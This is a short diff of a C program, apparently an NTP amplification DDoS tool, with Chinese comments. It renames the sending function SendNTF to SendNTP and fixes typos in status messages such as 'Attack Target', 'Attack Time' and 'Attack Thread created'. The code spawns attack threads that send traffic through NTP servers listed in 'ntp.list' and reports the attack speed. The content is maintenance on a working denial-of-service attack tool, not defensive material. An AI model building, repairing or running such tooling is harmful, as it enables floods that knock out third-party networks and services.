@@ -158,7 +158,7 @@ char ** GetNtpServersArr(char* s,const char* d)
 
 
 // 发包线程
-void* SendNTF(void* args)
+void* SendNTP(void* args)
 {
 
   extern int errno;
@@ -292,7 +292,7 @@ void* Mon(void* args)
     send_package = SEND_PACKAGE;  //取当前时间段发包总数
     time_range = difftimeval(&end, &start); //计算运行时间微秒级别
     per_second = ( ntp_buffer_size / 1000000 * send_package ) / (time_range / 1000000 );
-    printf(" [>] Speed %f M/S ,Sehd %d Pack , Current Server => %d\n",per_second,send_package,CURRENT_SERVER);
+    printf(" [>] Speed %f M/S ,Send %d Pack , Current Server => %d\n",per_second,send_package,CURRENT_SERVER);
   }
 }
 
@@ -336,8 +336,8 @@ int main(int argc, char* argv[])
   SEND_PACKAGE = 0;
 
   printf("[*] Attack Target: %s\n",TARGET_IP);
-  printf("[*] Threads: %ss\n",argv[2]);
-  printf("[*] Attack Time: %d\n",ATTACK_TIME);
+  printf("[*] Threads: %s\n",argv[2]);
+  printf("[*] Attack Time: %ds\n",ATTACK_TIME);
 
   if(GetNtpServers("ntp.list") == NULL)
   {
@@ -366,7 +366,7 @@ int main(int argc, char* argv[])
   gettimeofday(&ATTACK_START_TIME, NULL);//获取开始时间
   for(ti = 1; ti <= NUM_THREADS; ++ti)
   {
-      ret = pthread_create(&tids[ti], NULL, SendNTF, NULL);
+      ret = pthread_create(&tids[ti], NULL, SendNTP, NULL);
       if (ret == 0)
       {
         printf("[*] Attack Thread [%d] created\n",ti);
